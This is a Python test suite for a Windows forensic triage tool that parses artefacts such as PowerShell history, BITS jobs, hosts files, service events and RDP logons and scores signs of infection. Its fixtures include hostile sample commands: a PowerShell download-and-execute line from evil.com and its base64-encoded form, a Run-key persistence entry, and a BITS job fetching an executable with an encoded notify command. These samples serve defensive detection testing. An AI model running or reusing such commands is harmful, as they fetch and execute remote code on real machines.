#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
test_pipeline.py
パイプライン全体をモデルケースで動かし、バグを洗い出す。
LLM は使わない（analyze_fn をモック、または skip_llm で代替）。
"""

import sys, os, json, tempfile, traceback
from pathlib import Path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from parse_checkpc import (
    parse_appcompat_cache_csv,
    parse_hosts, parse_system_7045, parse_dns_cache, parse_netstat,
    parse_prefetch, parse_persistence_reg, parse_task_scheduler,
    parse_directory, parse_service, parse_ps_history, parse_av_quarantine,
    parse_bits_jobs, parse_inbound_rdp, parse_userassist, read_file,

)
from analyze_section import (
    entries_to_text, apply_level1_filter, apply_suspicious_filter,
    chunk_entries, SECTIONS_TO_ANALYZE, CHUNK_SIZE_DEPTH1,
    resolve_chunk_plan, resolve_n_out_max,  # v3.68: CHUNK_SIZE 廃止→動的チャンク
    MAX_TOKENS, analyze_defender_quarantine_rule_based, _apply_post_filter,
    analyze_known_tools, _is_public_ip, analyze_userassist_rule_based,
)
import analyze_section as _a_mod
# v3.66: LEAN既定ON化に伴い、本スイートのLLMスタブ系ケースは従来どおり
# FULL経路の回帰として維持する（LEAN経路は専用スイートが担当）。
_a_mod.LEAN_OUTPUT = 0
from section_prompts import get_prompt, get_level1_filters, LEVEL1_FILTERS
from report_gen import (
    generate_report, section_entries_md, _aggregate_low_entries,
    _should_show_lolbas, _fmt_datestamp, fmt_vt, SECTION_LABELS, SECTION_LABELS_SHORT,
)
from correlate import (extract_high_medium, build_correlate_text,
                       _apply_ioc_category_fallback, _annotate_known_infra_services)
from known_infra import identify_known_service
from batch_dashboard import collect_host_summary, find_cross_host_iocs, generate_dashboard_md

PASS = 0
FAIL = 0

def check(name, cond, detail=""):
    global PASS, FAIL
    if cond:
        print(f"  [OK]  {name}")
        PASS += 1
    else:
        print(f"  [FAIL] {name}" + (f": {detail}" if detail else ""))
        FAIL += 1

def section(title):
    print(f"\n{'─'*60}")
    print(f"  {title}")
    print(f"{'─'*60}")

# ═══════════════════════════════════════════════════════════════
# ケース A: 完全クリーンなPC（感染なし）
# ═══════════════════════════════════════════════════════════════
section("ケース A: クリーンPC（感染なし）")

hosts_clean = "127.0.0.1 localhost\n::1 localhost\n"
h = parse_hosts(hosts_clean)
check("A-1: hosts クリーン → entries=[]", len(h) == 0)

ps_clean = ["Get-Date", "Get-Process", "Get-Service"]
filt = apply_level1_filter("ps_history", ps_clean)
check("A-2: ps_history クリーンコマンド → Level1フィルタ通過0件",
      len(filt) == 0,
      f"フィルタ後={len(filt)}件: {filt}")

dns_clean_text = """
    www.microsoft.com
        レコードの種類 . . . . . . . : 1
        A (ホスト) レコード  . . . . : 20.112.52.29
"""
dns = parse_dns_cache(dns_clean_text)
check("A-3: dns_cache Microsoft → suspicious=False",
      all(not e.get("suspicious") for e in dns),
      str(dns))

netstat_clean = """
NETSTAT/nao
  TCP  127.0.0.1:445   127.0.0.1:0   LISTENING   4
  TCP  192.168.0.1:80  192.168.0.2:50123  ESTABLISHED  1234
"""
nc = parse_netstat(netstat_clean)
check("A-4: netstat parse → 2件", len(nc) == 2)

# ═══════════════════════════════════════════════════════════════
# ケース B: 感染PC（マルウェア典型パターン）
# ═══════════════════════════════════════════════════════════════
section("ケース B: 感染PC（マルウェア典型パターン）")

# B-1: hosts改ざん（AV無効化）
hosts_malicious = (
    "127.0.0.1 localhost\n"
    "0.0.0.0 update.microsoft.com\n"
    "0.0.0.0 www.kaspersky.com\n"
    "203.0.113.99 secure.bankofamerica.com\n"
)
hm = parse_hosts(hosts_malicious)
check("B-1: hosts AV無効化 → suspicious=True含む",
      any(e["suspicious"] for e in hm))
check("B-1b: hosts localhost除外",
      not any(e.get("hostname","").lower() == "localhost" for e in hm))

# B-2: ps_history 不審コマンド
ps_malicious = [
    "Get-Date",
    "iex (New-Object Net.WebClient).DownloadString('http://evil.com/x.ps1')",
    "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AeAAuAHAAcwAxACcAKQ==",
    "Set-ItemProperty HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -Name evil -Value C:\\Temp\\evil.exe",
]
filt_b2 = apply_level1_filter("ps_history", ps_malicious)
check("B-2: ps_history 不審コマンド → Level1フィルタで抽出",
      len(filt_b2) >= 2,
      f"フィルタ後={len(filt_b2)}件")
# "Get-Date" は除外されるべき
check("B-2b: ps_history Get-Date は除外",
      "Get-Date" not in filt_b2,
      str(filt_b2))

# B-3: system_7045 不審サービス
ev7045 = (
    "Event[1]\nDate: 2026-05-10T03:12:44.000\n"
    "Service Name: ryuk_persist\n"
    "Image Path: C:\\Windows\\Temp\\svch0st.exe\n"
    "Account Name: LocalSystem\n\n"
    "Event[2]\nDate: 2026-05-10T03:13:00.000\n"
    "Service Name: wuauserv_backup\n"  
    "Image Path: C:\\Windows\\System32\\svchost.exe -k netsvcs\n"
    "Account Name: NT AUTHORITY\\LocalService\n"
)
s7 = parse_system_7045(ev7045)
check("B-3: system_7045 parse → 2件", len(s7) == 2)
check("B-3b: system_7045 日時昇順", s7[0]["datetime"] <= s7[1]["datetime"])

# B-3c: Level1フィルタでTemp配下だけ抽出
filt_7045 = apply_level1_filter("system_7045", s7)
check("B-3c: system_7045 Level1フィルタ → Temp配下のみ抽出",
      len(filt_7045) == 1 and "Temp" in filt_7045[0]["image_path"],
      f"フィルタ後={len(filt_7045)}件: {[e['image_path'] for e in filt_7045]}")

# B-4: T-19 ログクリア検出
def make_log_clear_result(sec, raw_text):
    if not raw_text.strip():
        return {"section": sec, "entries": [], "section_summary": "イベントログクリアなし"}
    label = "セキュリティログ" if sec == "security_1102" else "システムログ"
    eid   = "1102" if sec == "security_1102" else "104"
    return {
        "section": sec,
        "entries": [{"identifier": f"EventID {eid}: {label}クリア検出",
                     "score": "HIGH", "mitre": ["T1070.001"], "iocs": [],
                     "reason": f"{label}クリア（T1070.001）"}],
        "section_summary": f"{label}クリアを検出",
    }

r_1102 = make_log_clear_result("security_1102", "Event[1]\nThe audit log was cleared.")
r_104  = make_log_clear_result("system_104",    "Event[1]\nThe system event log was cleared.")
r_empty = make_log_clear_result("security_1102", "")
check("B-4: security_1102 → HIGH", r_1102["entries"][0]["score"] == "HIGH")
check("B-4b: system_104 → HIGH",   r_104["entries"][0]["score"]  == "HIGH")
check("B-4c: 空 → entries=[]",     r_empty["entries"] == [])
check("B-4d: MITRE T1070.001",     "T1070.001" in r_1102["entries"][0]["mitre"])

# ═══════════════════════════════════════════════════════════════
# ケース C: entries_to_text の全セクション網羅
# ═══════════════════════════════════════════════════════════════
section("ケース C: entries_to_text 全セクション")

for sec in SECTIONS_TO_ANALYZE:
    # ダミーエントリで entries_to_text が例外を出さないことを確認
    try:
        if sec in ("security_1102", "system_104"):
            continue  # ルールベース、entries_to_text不使用
        if sec == "ps_history":
            dummy = ["dummy_command"]
        elif sec == "hosts":
            dummy = [{"ip":"127.0.0.1","hostname":"test.local","suspicious":False,"raw":""}]
        elif sec == "system_7045":
            dummy = [{"datetime":"2026-01-01","service_name":"svc","image_path":"C:\\svc.exe","account_name":"SYSTEM"}]
        elif sec in ("prefetch",):
            dummy = [{"name":"TEST.EXE-ABCD1234.pf","created":"2026/01/01 00:00","modified":"2026/01/01 01:00"}]
        elif sec == "dns_cache":
            dummy = [{"fqdn":"test.example.com","resolve":"1.2.3.4","suspicious":True}]
        elif sec == "netstat":
            dummy = [{"proto":"TCP","local":"0.0.0.0:8080","remote":"1.2.3.4:443","state":"ESTABLISHED","pid":"1234"}]
        elif sec == "directory":
            dummy = [{"date":"2026/01/01 00:00","size":"1234","path":"C:\\Temp\\evil.exe","name":"evil.exe","dir":"C:\\Temp"}]
        elif sec == "persistence_reg":
            dummy = [{"reg_key":"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run","entry_name":"evil","path":"C:\\Temp\\evil.exe"}]
        elif sec == "task_scheduler":
            dummy = [{"hostname":"TEST","task_name":"evil_task","next_run":"N/A","last_run":"N/A","task_path":"C:\\evil.exe","run_as":"SYSTEM","start_date":""}]
        elif sec == "service":
            dummy = [{"name":"evild","display_name":"Evil Daemon","state":"Running","start_type":"Auto","image_path":"C:\\Temp\\evil.exe","service_dll":""}]
        elif sec == "startup_folder":
            dummy = [{"path":"C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\evil.lnk","date":"2026/01/01 00:00","size":"1000","source":"windows_startup","suspicious":True}]
        elif sec == "defender_quarantine":
            dummy = [{"source":"defender_eventlog","vendor":"Windows Defender","datetime":"2026/01/01","threat_name":"Trojan:Win32/Evil","path":"C:\\Temp\\evil.exe","size":"","severity":"Severe","note":""}]
        elif sec == "appcompat_cache":
            dummy = [{"last_modified":"2026/01/01 00:00","last_update":"","path":"C:\\Temp\\evil.exe","file_size":"","exec_flag":"","suspicious":True,"blacklisted":False,"bl_comment":"","wrong_path":False}]
        else:
            dummy = [{"test":"value"}]
        
        t = entries_to_text(sec, dummy)
        check(f"C: entries_to_text({sec}) → 非空", bool(t) and t != "(データなし)")
    except Exception as e:
        check(f"C: entries_to_text({sec}) 例外なし", False, f"{type(e).__name__}: {e}")

# ═══════════════════════════════════════════════════════════════
# ケース D: chunk_entries の境界値テスト
# ═══════════════════════════════════════════════════════════════
section("ケース D: chunk_entries 境界値")

# 空リスト
for sec in ["ps_history", "hosts", "system_7045"]:
    chunks = chunk_entries(sec, [], depth=1)
    check(f"D: chunk_entries({sec}, [], depth=1) → []（空）",
          len(chunks) == 0)

# ちょうどchunksize件
for sec, depth in [("ps_history", 1), ("hosts", 1), ("system_7045", 1)]:
    size = CHUNK_SIZE_DEPTH1.get(sec, 8)
    dummy = [{"x": i} for i in range(size)]
    chunks = chunk_entries(sec, dummy, depth=1)
    check(f"D: chunk_entries({sec}, {size}件, depth=1) → 1チャンク",
          len(chunks) == 1,
          f"{len(chunks)}チャンク")

# size+1件でチャンク分割される
for sec, depth in [("ps_history", 1), ("system_7045", 1)]:
    size = CHUNK_SIZE_DEPTH1.get(sec, 8)
    dummy = [{"x": i} for i in range(size + 1)]
    chunks = chunk_entries(sec, dummy, depth=1)
    check(f"D: chunk_entries({sec}, {size+1}件, depth=1) → 2チャンク",
          len(chunks) == 2,
          f"{len(chunks)}チャンク")

# ═══════════════════════════════════════════════════════════════
# ケース E: report_gen の全セクション出力テスト
# ═══════════════════════════════════════════════════════════════
section("ケース E: report_gen 全セクション出力")

def make_analyzed(sections_data):
    return {
        "meta": {"hostname": "TESTPC", "datestamp": "20260601120000", "checkpc_version": "6.0.0"},
        "depth": 2,
        "sections": sections_data,
    }

def make_correlation(suspicion="NONE"):
    return {
        "infection_suspicion": suspicion,
        "infection_summary": "テストサマリ",
        "malware_family": "Unknown",
        "correlated_iocs": [],
        "timeline": [],
        "mitre_ttps": [],
        "recommended_actions": [],
    }

# E-1: 新セクションが report に出力される
for sec in ["ps_history", "hosts", "system_7045", "security_1102", "system_104"]:
    sec_data = {
        "section": sec,
        "entries": [{"identifier": "test_entry", "score": "HIGH",
                     "reason": "テスト根拠", "mitre": ["T1059.001"], "iocs": []}],
        "section_summary": "テストサマリ",
    }
    analyzed = make_analyzed({sec: sec_data})
    corr = make_correlation("HIGH")
    try:
        report = generate_report(analyzed, corr, full=False)
        label = SECTION_LABELS.get(sec, sec)
        check(f"E-1: {sec} → レポートにセクション見出し含む",
              f"### {label}" in report,
              f"ラベル '{label}' がレポートに見つからない")
        check(f"E-1b: {sec} → HIGH エントリ含む",
              "test_entry" in report)
    except Exception as e:
        check(f"E-1: {sec} レポート生成 例外なし", False, traceback.format_exc())

# E-2: 全セクション同時出力（干渉なし）
all_sections = {}
for sec in ["ps_history", "hosts", "system_7045", "security_1102", "system_104",
            "persistence_reg", "task_scheduler", "defender_quarantine"]:
    all_sections[sec] = {
        "section": sec,
        "entries": [{"identifier": f"{sec}_entry", "score": "MEDIUM",
                     "reason": "根拠", "mitre": [], "iocs": []}],
        "section_summary": f"{sec} summary",
    }
analyzed_all = make_analyzed(all_sections)
corr_all = make_correlation("MEDIUM")
try:
    report_all = generate_report(analyzed_all, corr_all, full=False)
    check("E-2: 全セクション同時出力 → 例外なし", True)
    check("E-2b: 全セクション → 各ラベル含む",
          all(SECTION_LABELS.get(s, s) in report_all for s in all_sections),
          "一部ラベル欠落")
except Exception as e:
    check("E-2: 全セクション同時出力 例外なし", False, traceback.format_exc())

# E-3: full=True でも正常動作
try:
    report_full = generate_report(analyzed_all, corr_all, full=True)
    check("E-3: full=True → 例外なし", True)
except Exception as e:
    check("E-3: full=True 例外なし", False, traceback.format_exc())

# ═══════════════════════════════════════════════════════════════
# ケース F: _fmt_datestamp の境界値
# ═══════════════════════════════════════════════════════════════
section("ケース F: _fmt_datestamp 境界値")

check("F-1: 16桁", _fmt_datestamp("2026060414400063") == "2026-06-04 14:40:00")
check("F-2: 14桁", _fmt_datestamp("20260604144000")   == "2026-06-04 14:40:00")
check("F-3: 空文字", _fmt_datestamp("") == "")
check("F-4: 短い文字列", isinstance(_fmt_datestamp("abc"), str))
check("F-5: 曜日混入(日本語)", isinstance(_fmt_datestamp("20260608-日曜23440774"), str))

# ═══════════════════════════════════════════════════════════════
# ケース G: correlate のデータ圧縮ロジック
# ═══════════════════════════════════════════════════════════════
section("ケース G: correlate extract_high_medium / build_correlate_text")

analyzed_g = make_analyzed({
    "ps_history": {
        "entries": [
            {"identifier": "iex ...", "score": "HIGH", "reason": "DownloadString"},
            {"identifier": "Get-Date", "score": "CLEAN", "reason": "正規"},
        ],
        "section_summary": "不審コマンド検出",
    },
    "security_1102": {
        "entries": [{"identifier": "EventID 1102", "score": "HIGH", "reason": "ログクリア", "mitre": ["T1070.001"]}],
        "section_summary": "ログクリア検出",
    },
    "hosts": {
        "entries": [{"identifier": "update.microsoft.com", "score": "HIGH", "reason": "AV無効化"}],
        "section_summary": "hosts改ざん",
    },
    "dns_cache": {
        "entries": [{"identifier": "evil.example.com", "score": "MEDIUM", "reason": "不審ドメイン"}],
        "section_summary": "",
    },
})

hm = extract_high_medium(analyzed_g)
check("G-1: HIGH/MEDIUMのみ抽出", "ps_history" in hm and "dns_cache" in hm)
check("G-2: CLEAN除外", all(
    e.get("score") in ("HIGH","MEDIUM")
    for sd in hm.values() for e in sd.get("entries",[])
), f"CLEAN残存: {hm}")
check("G-3: security_1102 含む", "security_1102" in hm)
check("G-4: hosts 含む", "hosts" in hm)

text, corr_stats = build_correlate_text(hm, depth=2, budget_tokens=13000)
check("G-5: correlate text 非空", bool(text.strip()))
check("G-6: ps_history セクション含む", "ps_history" in text)
check("G-7: security_1102 セクション含む", "security_1102" in text)
# v3.68: 12000文字の単純切断は廃止。トークン予算内であること・HIGH消失なしを検証。
check("G-8: high_unrepresented == 0（HIGHは落とさない）",
      corr_stats["high_unrepresented"] == 0, str(corr_stats))
check("G-8b: used_tokens <= budget_tokens",
      corr_stats["used_tokens"] <= corr_stats["budget_tokens"], str(corr_stats))

# ═══════════════════════════════════════════════════════════════
# ケース H: apply_suspicious_filter の全対象セクション
# ═══════════════════════════════════════════════════════════════
section("ケース H: apply_suspicious_filter 全対象")

for sec in ["appcompat_cache", "dns_cache", "hosts"]:
    entries = [
        {"suspicious": True,  "data": "bad"},
        {"suspicious": False, "data": "good"},
    ]
    result = apply_suspicious_filter(sec, entries)
    check(f"H: {sec} → suspicious=True のみ", len(result) == 1 and result[0]["data"] == "bad")

# 非対象セクションは全通過
for sec in ["ps_history", "system_7045", "netstat"]:
    entries = [{"suspicious": False, "data": "x"}, {"data": "y"}]
    result = apply_suspicious_filter(sec, entries)
    check(f"H: {sec} → 全通過（{len(result)}件）", len(result) == 2)

# ═══════════════════════════════════════════════════════════════
# ケース I: プロンプトの {data} プレースホルダー欠損チェック
# ═══════════════════════════════════════════════════════════════
section("ケース I: 全セクション・全depth プロンプト整合性")

for sec in SECTIONS_TO_ANALYZE:
    if sec in ("security_1102", "system_104", "task_141", "rdp_inbound", "known_tools", "userassist",
               "psexec"):  # psexec: ルールベース注記(T-23-psexec, v3.58)・プロンプト不使用
        continue  # ルールベース、プロンプト不使用
    for d in [1, 2, 3, 4]:
        p = get_prompt(sec, d)
        check(f"I: {sec} depth={d} プロンプト非空", bool(p), f"空プロンプト")
        if p:
            check(f"I: {sec} depth={d} {{data}}含む", "{data}" in p,
                  f"{{data}}プレースホルダー欠損")

# ═══════════════════════════════════════════════════════════════
# ケース J: MAX_TOKENS / TOK_PER_ENTRY / CHUNK_SIZE_DEPTH1 の全セクション定義チェック
# ═══════════════════════════════════════════════════════════════
section("ケース J: MAX_TOKENS / TOK_PER_ENTRY / CHUNK_SIZE_DEPTH1 定義網羅")

for sec in SECTIONS_TO_ANALYZE:
    if sec in ("security_1102", "system_104", "task_141", "rdp_inbound", "known_tools", "userassist",
               "psexec"):  # psexec: ルールベース注記(T-23-psexec, v3.58)・プロンプト不使用
        continue
    check(f"J: MAX_TOKENS[{sec}]", sec in MAX_TOKENS, "未定義")
    check(f"J: CHUNK_SIZE_DEPTH1[{sec}] 定義（depth1 の上限）",
          sec in CHUNK_SIZE_DEPTH1, "未定義")
    # v3.68: depth>=2 は resolve_n_out_max が MAX_TOKENS と TOK_PER_ENTRY から
    # 動的に件数を決めるため、CHUNK_SIZE 表は不要になった。
    _n2 = resolve_n_out_max(sec, 2, lean=False)
    check(f"J: resolve_n_out_max({sec}, depth=2) >= 1", _n2 >= 1, f"{_n2}")

# ═══════════════════════════════════════════════════════════════
# ケース K: parse_system_7045 のエッジケース
# ═══════════════════════════════════════════════════════════════
section("ケース K: parse_system_7045 エッジケース")

# K-1: 空入力
check("K-1: 空文字 → []", parse_system_7045("") == [])
check("K-2: 空白のみ → []", parse_system_7045("   \n  ") == [])

# K-2: 重複イベント除外
# 注: parse_system_7045 の dedup キーは (service_name, datetime)。
#     同名サービスでも登録時刻が異なれば別イベントとして保持する設計
#     （parse_checkpc.py の該当コメント参照）。真の重複は同名＋同時刻。
dup = (
    "Event[1]\nDate: 2026-01-01T00:00:00\nService Name: svc_a\nImage Path: C:\\evil.exe\n\n"
    "Event[2]\nDate: 2026-01-01T00:00:00\nService Name: svc_a\nImage Path: C:\\evil.exe\n"
)
r = parse_system_7045(dup)
check("K-3: 重複(同名+同時刻) → 1件に集約", len(r) == 1, f"{len(r)}件")

# K-3b: 同名でも時刻が異なれば別イベントとして保持（時刻ベース dedup）
dup2 = (
    "Event[1]\nDate: 2026-01-01T00:00:00\nService Name: svc_a\nImage Path: C:\\evil.exe\n\n"
    "Event[2]\nDate: 2026-01-01T00:01:00\nService Name: svc_a\nImage Path: C:\\evil.exe\n"
)
r_t = parse_system_7045(dup2)
check("K-3b: 同名+別時刻 → 2件保持", len(r_t) == 2, f"{len(r_t)}件")

# K-3: Account Name なしでもクラッシュしない
no_account = "Event[1]\nDate: 2026-01-01T00:00:00\nService Name: svc_b\nImage Path: C:\\svc.exe\n"
r2 = parse_system_7045(no_account)
check("K-4: Account Name なし → account_name=''",
      r2[0]["account_name"] == "", f"account_name={r2[0]['account_name']!r}")

# ケース L: parse_hosts のエッジケース
section("ケース L: parse_hosts エッジケース")

check("L-1: 空文字 → []", parse_hosts("") == [])
check("L-2: コメントのみ → []", parse_hosts("# comment\n# another\n") == [])

# インラインコメント除去
inline = "0.0.0.0 evil.com # added by malware\n"
r = parse_hosts(inline)
check("L-3: インラインコメント除去 → hostname=evil.com",
      r[0]["hostname"] == "evil.com", f"hostname={r[0]['hostname']!r}")

# IPv6
ipv6 = "::1 localhost\n2001:db8::1 test.ipv6.local\n"
r = parse_hosts(ipv6)
# localhost は除外、ipv6 エントリは残る
check("L-4: IPv6 非ループバック → suspicious=True",
      any(e["hostname"] == "test.ipv6.local" for e in r))

# ═══════════════════════════════════════════════════════════════
# ケース N: parse_bits_jobs / BITS post-filter（T-23）
# ═══════════════════════════════════════════════════════════════
section("ケース N: BITS ジョブ（T-23）")

# N-1: 空入力 → []
check("N-1: 空文字 → []", parse_bits_jobs("") == [])
check("N-2: 空白のみ → []", parse_bits_jobs("   \n  ") == [])

# N-3: "Listed 0 job(s)." → [] （ジョブなしホスト）
bits_none = (
    "bitsadmin /list /allusers /verbose\n\n"
    "BITSADMIN version 3.0\nBITS administration utility.\n\n"
    "Listed 0 job(s).\n"
)
check("N-3: Listed 0 job(s). → []", parse_bits_jobs(bits_none) == [])

# N-4: 実フォーマット相当の正規ジョブ（Edge Component Updater）
bits_clean = (
    "GUID: {80047BA9-5B99-44F9-A64E-D320508F4F71} DISPLAY: 'Edge Component Updater'\n"
    "TYPE: DOWNLOAD STATE: TRANSFERRED OWNER: HOST\\fixture-user-02\n"
    "CREATION TIME: 2026/06/17 19:18:02 MODIFICATION TIME: 2026/06/17 19:18:24\n"
    "JOB FILES: \n"
    "\t186331 / 186331 WORKING http://msedge.b.tlu.dl.delivery.mp.microsoft.com/files/x -> C:\\Users\\fixture-user-02\\AppData\\Local\\Temp\\x\n"
    "NOTIFICATION COMMAND LINE: none\n"
    "owner MIC integrity level: MEDIUM\n"
    "owner elevated ?           false\n"
)
b = parse_bits_jobs(bits_clean)
check("N-4: 正規ジョブ → 1件", len(b) == 1, f"{len(b)}件")
check("N-4b: display 抽出", b and b[0]["display"] == "Edge Component Updater")
check("N-4c: owner 抽出", b and b[0]["owner"] == "HOST\\fixture-user-02")
check("N-4d: url 抽出", b and b[0]["url"].startswith("http://msedge.b.tlu.dl.delivery.mp.microsoft.com"))
check("N-4e: notify=none 抽出", b and b[0]["notify_cmd"] == "none")
check("N-4f: state=TRANSFERRED", b and b[0]["state"] == "TRANSFERRED")

# N-5: 悪性ジョブ（外部URL + 通知コマンドあり）
bits_evil = (
    "GUID: {11111111-2222-3333-4444-555555555555} DISPLAY: 'update'\n"
    "TYPE: DOWNLOAD STATE: TRANSFERRED OWNER: HOST\\user\n"
    "JOB FILES: \n"
    "\t1 / 1 WORKING http://evil.example.com/p.exe -> C:\\Users\\Public\\p.exe\n"
    "NOTIFICATION COMMAND LINE: powershell -enc SQBFAFgA\n"
    "owner MIC integrity level: HIGH\n"
)
e = parse_bits_jobs(bits_evil)
check("N-5: 悪性ジョブ → notify_cmd にコマンド本体保持",
      e and e[0]["notify_cmd"].startswith("powershell -enc"), f"{e[0]['notify_cmd'] if e else None!r}")
check("N-5b: 悪性ジョブ url 抽出", e and e[0]["url"] == "http://evil.example.com/p.exe")

# N-6: GUID 重複は1件に集約
b2 = parse_bits_jobs(bits_clean + "\n" + bits_clean)
check("N-6: 同一GUID重複 → 1件に集約", len(b2) == 1, f"{len(b2)}件")

# N-7: entries_to_text は url と notify を必ず含む
txt = entries_to_text("bits_jobs", b)
check("N-7: entries_to_text に URL 行", "URL:" in txt and "delivery.mp.microsoft.com" in txt)
check("N-7b: entries_to_text に notify 行", "notify" in txt and "none" in txt)

# N-8: post-filter — MS正規配信URL + notify none → CLEAN降格
pf_clean = {"section": "bits_jobs", "entries": [
    {"identifier": "Edge", "score": "HIGH", "reason": "BITS",
     "iocs": [b[0]["url"], "notify: none"]},
]}
_apply_post_filter("bits_jobs", pf_clean)
check("N-8: MS配信+notify none → CLEAN", pf_clean["entries"][0]["score"] == "CLEAN",
      pf_clean["entries"][0]["score"])

# N-9: post-filter — 外部URL → 降格しない（HIGH維持）
pf_evil = {"section": "bits_jobs", "entries": [
    {"identifier": "evil", "score": "HIGH", "reason": "C2",
     "iocs": ["http://evil.example.com/p.exe", "notify: powershell -enc ..."]},
]}
_apply_post_filter("bits_jobs", pf_evil)
check("N-9: 外部URL → HIGH維持", pf_evil["entries"][0]["score"] == "HIGH",
      pf_evil["entries"][0]["score"])

# N-10: post-filter — MS URL でも通知コマンドありは降格しない（厳格側）
pf_ms_notify = {"section": "bits_jobs", "entries": [
    {"identifier": "x", "score": "HIGH", "reason": "y",
     "iocs": ["http://msedge.b.tlu.dl.delivery.mp.microsoft.com/files/x",
              "notify: rundll32 evil.dll,Run"]},
]}
_apply_post_filter("bits_jobs", pf_ms_notify)
check("N-10: MS URL + 通知コマンドあり → 降格しない", pf_ms_notify["entries"][0]["score"] == "HIGH",
      pf_ms_notify["entries"][0]["score"])

# N-11: bits_jobs / task_141 は SECTIONS_TO_ANALYZE と各設定に登録済み
check("N-11: bits_jobs in SECTIONS_TO_ANALYZE", "bits_jobs" in SECTIONS_TO_ANALYZE)
check("N-11b: task_141 in SECTIONS_TO_ANALYZE", "task_141" in SECTIONS_TO_ANALYZE)
check("N-11c: bits_jobs MAX_TOKENS 定義", "bits_jobs" in MAX_TOKENS)
check("N-11d: bits_jobs CHUNK_SIZE_DEPTH1 定義", "bits_jobs" in CHUNK_SIZE_DEPTH1)
check("N-11e: bits_jobs depth1 プロンプト存在", bool(get_prompt("bits_jobs", 1)))

# ═══════════════════════════════════════════════════════════════
# ケース O: 着信RDP / MpKsl / known_tools（N-1/N-2/N-3）
# ═══════════════════════════════════════════════════════════════
section("ケース O: 着信RDP・MpKsl・known_tools（N-1/N-2/N-3）")

# --- N-1: parse_inbound_rdp ---
check("O-1: 空入力 → []", parse_inbound_rdp("", "") == [])

eid21 = (
    "Event[0]:\n  Date: 2024-06-18T22:51:57.889\n  Event ID: 21\n  User: S-1-5-18\n"
    "  User Name: NT AUTHORITY\\SYSTEM\n  Description: \n"
    "リモート デスクトップ サービス: セッション ログオンに成功しました:\n\n"
    "ユーザー: HOST-REF-10\\admin\nセッション ID: 3\n"
    "ソース ネットワーク アドレス: 61.216.184.20\n\n"
    "Event[1]:\n  Date: 2021-03-08T23:35:09\n  Event ID: 21\n  Description: \n"
    "ユーザー: HOST\\user\nセッション ID: 1\nソース ネットワーク アドレス: ローカル\n"
)
r = parse_inbound_rdp(eid21, "")
check("O-2: ローカルログオン除外 → 外部1件のみ", len(r) == 1, f"{len(r)}件")
check("O-3: 接続元IP抽出", r and r[0]["source_ip"] == "61.216.184.20",
      f"{r[0]['source_ip'] if r else None!r}")
check("O-4: ユーザー抽出(SIDでなくDOMAIN\\user)", r and r[0]["user"] == "HOST-REF-10\\admin",
      f"{r[0]['user'] if r else None!r}")
check("O-5: session_id抽出", r and r[0]["session_id"] == "3")

# --- _is_public_ip ---
check("O-6: 外部IP判定(台湾)", _is_public_ip("61.216.184.20") is True)
check("O-7: RFC1918 → 内部", _is_public_ip("192.168.1.10") is False)
check("O-8: 172.16-31 → 内部", _is_public_ip("172.20.5.5") is False and _is_public_ip("10.1.2.3") is False)
check("O-9: ループバック → 内部", _is_public_ip("127.0.0.1") is False)
check("O-10: グローバルIPv6 → 外部", _is_public_ip("2001:db8::1") is True)
check("O-11: ::1 → 内部", _is_public_ip("::1") is False)

# --- N-2: MpKsl CLEAN post-filter ---
mpksl = {"section": "system_7045", "entries": [
    {"identifier": "MpKsl2e6dda6e", "score": "HIGH", "reason": "乱数サービス名",
     "iocs": ["C:\\ProgramData\\Microsoft\\Windows Defender\\Definition Updates\\{GUID}\\MpKslDrv.sys"]},
    {"identifier": "evilsvc", "score": "HIGH", "reason": "不審",
     "iocs": ["C:\\Users\\Public\\evil.exe"]},
]}
_apply_post_filter("system_7045", mpksl)
check("O-12: MpKsl+Defenderパス → CLEAN", mpksl["entries"][0]["score"] == "CLEAN",
      mpksl["entries"][0]["score"])
check("O-13: 非MpKsl HIGH → 維持", mpksl["entries"][1]["score"] == "HIGH",
      mpksl["entries"][1]["score"])

# --- N-3: analyze_known_tools ---
secs = {
    "service": [
        {"name": "rserver3", "image_path": "\"C:\\Windows\\rserver\\RServer3.exe\" /service"},
        {"name": "windefend", "image_path": "%SystemRoot%\\System32\\svchost.exe -k secsvcs"},
    ],
    "appcompat_cache": [
        {"path": "C:\\.moneroocean\\xmrig.exe"},
        {"path": "C:\\Windows\\System32\\notepad.exe"},
    ],
    "tasklist": [
        {"name": "folders.exe", "commandline": "C:\\Users\\Administrator\\Desktop\\folders514\\folders.exe"},
    ],
    "directory": [
        {"path": "C:\\xampp\\htdocs\\d76ea66.php"},
        {"path": "C:\\xampp\\htdocs\\2e47080.php"},
        {"path": "C:\\Windows\\System32\\kernel32.dll"},
    ],
}
kt = analyze_known_tools(secs)
ids = " || ".join(e["identifier"] for e in kt["entries"])
scores = {e["score"] for e in kt["entries"]}
check("O-14: known_tools が xmrig を HIGH 検出", any("xmrig" in e["identifier"] and e["score"]=="HIGH" for e in kt["entries"]), ids)
check("O-15: known_tools が rserver を検出", any("rserver" in e["identifier"].lower() or "RServer3" in e["identifier"] for e in kt["entries"]), ids)
check("O-16: C:\\Windows\\rserver サービスは検出されるが HIGH ではない（OEM配慮）",
      any(("rserver" in e["identifier"].lower() or "RServer3" in e["identifier"]) for e in kt["entries"])
      and not any(("rserver" in e["identifier"].lower() or "RServer3" in e["identifier"]) and e["score"]=="HIGH" for e in kt["entries"]), ids)
check("O-17: Webシェル候補(htdocs *.php) を検出",
      any("Webシェル候補" in e["identifier"] for e in kt["entries"]), ids)
check("O-18: 正規(System32/svchost) は誤検出しない",
      not any("notepad" in e["identifier"] or "kernel32" in e["identifier"] or "windefend" in e["identifier"] for e in kt["entries"]), ids)
check("O-19: known_tools クリーン環境 → 該当なし",
      analyze_known_tools({"service":[{"name":"x","image_path":"%SystemRoot%\\System32\\svchost.exe -k netsvcs"}],
                           "appcompat_cache":[], "tasklist":[], "directory":[]})["entries"] == [])

# --- 設定登録確認 ---
